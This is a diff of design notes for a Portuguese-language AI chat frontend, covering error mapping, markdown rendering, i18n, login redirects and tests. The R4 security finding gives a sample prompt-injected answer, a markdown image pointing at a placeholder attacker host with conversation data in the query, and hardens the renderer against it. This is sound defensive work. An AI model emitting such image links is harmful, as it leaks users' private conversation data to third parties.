@@ -27,12 +27,15 @@ shadcn `base-nova` style on `@base-ui/react`.
   `src/lib/chat/errors.ts`. It uses `APICallError.isInstance()`, parses `responseBody` as the
   contract body `{error: {code, message, retryAfterSeconds?}}` (safe-parse; non-JSON → generic),
   and maps `code` → kind. `retryAfterSeconds` comes from the body (the contract always sends it
-  for `rate_limited`); a missing value falls back to 60 s. Non-`APICallError` errors are
-  mid-stream/network → `retryable` with the error's message only if it came from an `error`
-  chunk, otherwise the catalog fallback.
-- **Telling network errors apart from `error` chunks**: `TypeError` (fetch failure) and
-  `AbortError` are mapped to the catalog fallback; other plain `Error`s carry the contract's
-  user-facing `errorText`.
+  for `rate_limited`); a missing value falls back to 60 s. Headers (`Retry-After`) are not
+  available. Any other error is `retryable`. Its message is shown **only** when it is a bare
+  `Error` (constructor `Error`, not `AISDKError.isInstance`, not `TypeError`/`AbortError`),
+  because only that case carries the contract's user-facing `errorText`. Everything else uses the
+  catalog fallback (`TypeValidationError`, `JSONParseError`, fetch failures, non-JSON bodies).
+- **Dropped stream**: ai@7 ends a stream closed without `finish` as `status: "ready"` with no
+  error, the same as a user Stop. `useChat`'s `onFinish({isAbort, isError, finishReason})` tells
+  them apart: `!isAbort && !isError && finishReason == null` → local `retryable` error (catalog
+  fallback), cleared on retry or on the next send. A Stop (`isAbort`) never shows an error.
 - **Rationale**: a pure mapper is trivially unit-testable from the `http-*.json` fixtures.
 - **Alternatives**: a custom `fetch` wrapper that inspects responses before the SDK (more code,
   same information); reading `Retry-After` header (not available through the SDK error).
@@ -48,12 +51,25 @@ shadcn `base-nova` style on `@base-ui/react`.
 
 ## R4 — Markdown rendering while streaming
 
-- **Decision**: `streamdown` (v2) for assistant text.
+- **Decision**: `streamdown` (v2.7.1) for assistant text, **with a hardened configuration**.
+- **Security finding (review blocker)**: the 2.7.1 defaults are `rehypePlugins = {raw, sanitize,
+  harden}`, where harden uses `allowedLinkPrefixes: ["*"]`, `allowedImagePrefixes: ["*"]`,
+  `allowedProtocols: ["*"]` and `allowDataImages: true`. A prompt-injected answer such as
+  `![](https://attacker/?q=<conversation PII>)` would leak data through the image request.
+- **Hardened config**:
+  - `rehypePlugins={[defaultRehypePlugins.sanitize, [harden, {allowedLinkPrefixes: ["https://", "http://", "mailto:"], allowedImagePrefixes: [], allowedProtocols: ["https", "http", "mailto"], allowDataImages: false}]]}`. Dropping `raw` means raw HTML is never parsed.
+  - `components={{img: () => null}}` as a second guard.
+  - `controls={false}`, so there are no copy/download buttons.
+  - `translations` from the catalog.
+  - `mode="streaming"` with `parseIncompleteMarkdown`.
+  - Exact prop names are confirmed in `node_modules/streamdown/dist/index.d.ts`.
+- **Tailwind v4**: Streamdown's classes live in its dist files. `globals.css` needs
+  `@source "../node_modules/streamdown/dist/*.js";` (path relative to `src/app/globals.css`),
+  otherwise tables and code silently lose their styling.
 - **Rationale**: built for AI streaming. `remend` closes incomplete markdown (unclosed `**`, half
-  tables) so the layout does not flash; GFM tables; sanitization (`rehype-sanitize`) and
-  `rehype-harden` link/image protocol allow-lists cover FR-002 (no raw HTML execution, no
-  `javascript:` links). v2 keeps syntax highlighting/math/mermaid as opt-in plugins, so the core
-  stays small. It is the renderer AI SDK UI examples use.
+  tables) so the layout does not flash. It supports GFM tables and ships the sanitize/harden
+  pipeline we tighten above. v2 keeps syntax highlighting, math and mermaid as opt-in plugins, so
+  the core stays small.
 - **Alternatives**: `react-markdown` + `remark-gfm` (safe defaults, but shows raw `**` mid-stream
   and needs manual link hardening); AI Elements registry (pulls many components we don't need
   before the Figma pass). Exact props (`parseIncompleteMarkdown`, link safety options) are
@@ -71,12 +87,18 @@ shadcn `base-nova` style on `@base-ui/react`.
 
 ## R6 — Copy catalog (pt-BR, PT/EN-ready)
 
-- **Decision**: `src/lib/i18n/pt-BR.ts` exports a typed `messages` object (nested keys);
-  `src/lib/i18n/index.ts` exports `t` helpers (`messages` getter + `format(key, vars)` for
-  `{seconds}`-style interpolation). The type of the pt-BR object is the `Messages` shape an `en`
-  catalog must satisfy in #13. Tool labels and availability labels live in the catalog; the tool
-  table is copied verbatim from the contract and a unit test asserts every contract tool name has
-  a label.
+- **Decision**:
+  - `src/lib/i18n/pt-BR.ts` exports a typed catalog; its type is the `Messages` shape an `en`
+    catalog must satisfy in #13.
+  - `src/lib/i18n/index.tsx` exports `locale` (`"pt-BR"`), `useMessages()` (a hook over a tiny
+    context that defaults to pt-BR, so #13 swaps only the provider value) and
+    `format(template, vars)`.
+  - Formatters take a locale parameter: `formatBrl(value, locale)`.
+  - `<html lang>` comes from `locale`.
+  - Server components that need copy (the login page) read the same catalog through
+    `getMessages(locale)`.
+  - The tool-label test compares the catalog keys with a const list of the 11 contract tool
+    names; there is no markdown parsing.
 - **Alternatives**: `next-intl` now (routing/middleware for a feature we don't ship yet — YAGNI;
   #13 can adopt it and reuse the catalog shape).
 
@@ -84,7 +106,10 @@ shadcn `base-nova` style on `@base-ui/react`.
 
 - **Decision**: `src/app/login/page.tsx` server page rendering a static shell and a client
   `<LoginNotice/>` that reads `useSearchParams()` wrapped in `<Suspense>` (required: Next 16 docs,
-  `use-search-params.md` § Prerendering). Redirect from the chat uses `useRouter().replace(...)`.
+  `use-search-params.md` § Prerendering). Redirect from the chat uses
+  `useRouter().replace("/login?reason=expired&callbackUrl=/")`. `callbackUrl` matches Auth.js
+  `pages.signIn`, so #10 can drop in its form. #10 should gate sessions in `proxy.ts`, not in the
+  page, so `/` stays prerendered under Cache Components.
 - **Alternatives**: reading `searchParams` in the server page (also needs a Suspense boundary
   under Cache Components; client hook is simpler to replace in #10).
 
@@ -98,6 +123,9 @@ shadcn `base-nova` style on `@base-ui/react`.
   - **Flow tests** render `<Chat/>` with a stub `fetch` (passed to the transport) that returns
     the real fixture bodies/status codes, so `useChat` itself is exercised end to end with no
     server. `/fixture <name>` is not needed in tests.
+  - **Fake timers** can stall streams (the mock and SDK use timers/microtasks). Only fake
+    `setInterval` (`vi.useFakeTimers({toFake: ["setInterval"]})`) for the countdown, and pair with
+    `userEvent.setup({advanceTimers: vi.advanceTimersByTime})`.
 - **Rationale**: no network, no API key (constitution IV); fixtures stay the single source.
 - **Alternatives**: Playwright (that is #16); MSW (extra dependency for one endpoint).
 
@@ -108,6 +136,26 @@ shadcn `base-nova` style on `@base-ui/react`.
   `aria-live="polite"` region announces each assistant message when it finishes (not per token).
   Tap targets ≥ 44 px (`size-11`). Stick-to-bottom scrolling: scroll to bottom on new content only
   when the user is within ~80 px of the bottom.
-- **375 px check**: a component test asserts no element in the rendered fixtures has a
-  fixed width greater than the viewport (layout classes), plus a manual check at 375 × 667
-  recorded in the final PR; automation is #16.
+- **375 px check**: manual at 375 × 667 with a screenshot in the final PR (no class-name layout
+  test; automation is #16).
+- Error notices use `role="alert"`.
+
+## R10 — Cache Components pitfalls
+
+- **Decision**: never read `chat.id` or call `generateId`/`Math.random`/`Date.now` during render
+  of a prerendered component (`blocking-prerender-random-client`). `useChat` creates its id
+  internally; it is read only inside event handlers/effects. Run `pnpm build` in the first
+  implementation PR to catch this early.
+
+## R11 — Fail-closed mock in production
+
+- **Finding**: `route.ts` uses `CHAT_MODE ?? "mock"`. If the variable is missing in production,
+  the public URL would serve fixtures, or return 500 because `../contracts` is not bundled.
+- **Decision**: mode = `CHAT_MODE ?? (NODE_ENV === "production" ? "backend" : "mock")`, extracted
+  to a tiny `chatMode()` helper with a unit test. Auth on the route stays in #10.
+
+## R12 — Double-send guard
+
+- **Decision**: `status` updates asynchronously, so a ref (`sendingRef`) set synchronously in the
+  send handler and cleared when `status` leaves `submitted`/`streaming` blocks a second Enter or
+  click in the same tick.
